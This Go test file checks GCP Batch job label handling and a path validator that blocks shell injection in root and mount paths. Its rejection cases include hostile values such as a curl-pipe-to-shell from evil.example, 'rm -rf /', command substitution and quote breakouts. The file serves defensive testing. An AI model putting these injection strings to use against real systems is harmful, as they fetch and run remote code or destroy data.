package monitor

import (
	"context"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

func TestGCPJobLabels_IncludesUserLabelsAndReservedWorkpoolLabel(t *testing.T) {
	spec := &WorkerJobSpec{
		WorkpoolID: "pool-1",
		Labels:     []Label{{Name: "team", Value: "alice"}, {Name: "env", Value: "prod"}},
	}
	labels := gcpJobLabels(spec)
	assert.Equal(t, map[string]string{
		"team":        "alice",
		"env":         "prod",
		labelWorkpool: "pool-1",
	}, labels)
}

func TestGCPJobLabels_NoUserLabels(t *testing.T) {
	spec := &WorkerJobSpec{WorkpoolID: "pool-1"}
	labels := gcpJobLabels(spec)
	assert.Equal(t, map[string]string{labelWorkpool: "pool-1"}, labels)
}

func TestGCPJobLabels_ReservedKeyCannotBeClobbered(t *testing.T) {
	spec := &WorkerJobSpec{
		WorkpoolID: "pool-1",
		Labels:     []Label{{Name: labelWorkpool, Value: "some-other-value"}},
	}
	labels := gcpJobLabels(spec)
	assert.Equal(t, "pool-1", labels[labelWorkpool])
}

func TestValidSafePath(t *testing.T) {
	valid := []string{
		"/mnt/sparkles",
		"/",
		"/a",
		"/data-vol_1/sub.dir",
	}
	for _, p := range valid {
		assert.True(t, validSafePath(p), "expected %q to be valid", p)
	}

	// Anything that could break out of an unquoted shell interpolation, plus
	// non-absolute paths.
	invalid := []string{
		"",
		"relative/path",
		"/tmp; curl evil.example/x.sh | sh #",
		"/tmp && rm -rf /",
		"/tmp`whoami`",
		"/tmp$(whoami)",
		"/tmp' ; touch pwned; '",
		`/tmp"; touch pwned; "`,
		"/tmp\nrm -rf /",
		"/tmp with space",
	}
	for _, p := range invalid {
		assert.False(t, validSafePath(p), "expected %q to be rejected", p)
	}
}

// baseValidSpec returns a WorkerJobSpec that satisfies every CreateJob
// precondition except the one the caller overrides, so tests can isolate a
// single validation failure without needing a real Batch API connection
// (CreateJob returns before making any network call once validation fails).
func baseValidSpec() *WorkerJobSpec {
	return &WorkerJobSpec{
		WorkpoolID:     "pool-1",
		ServiceAccount: "sa@example.iam.gserviceaccount.com",
		Region:         "us-central1",
		RootDir:        "/mnt/sparkles",
		Resources:      []ResourceEntry{{Name: "slots", Value: 1}},
	}
}

func TestCreateJob_RejectsShellMetacharactersInRootDir(t *testing.T) {
	c := &GCPBatchAPIClient{project: "control-plane-project"}
	spec := baseValidSpec()
	spec.RootDir = "/tmp; curl evil.example/x.sh | sh #"

	_, err := c.CreateJob(context.Background(), spec)
	require.Error(t, err)
	assert.Contains(t, err.Error(), "invalid root dir")
}

func TestCreateJob_RejectsShellMetacharactersInEmptyVolumeMountPoint(t *testing.T) {
	c := &GCPBatchAPIClient{project: "control-plane-project"}
	spec := baseValidSpec()
	spec.EmptyVolumes = []EmptyVolume{{MountPoint: "/data' ; touch /tmp/pwned; '", Type: "pd-ssd", SizeInGB: 10}}

	_, err := c.CreateJob(context.Background(), spec)
	require.Error(t, err)
	assert.Contains(t, err.Error(), "invalid empty volume mount point")
}
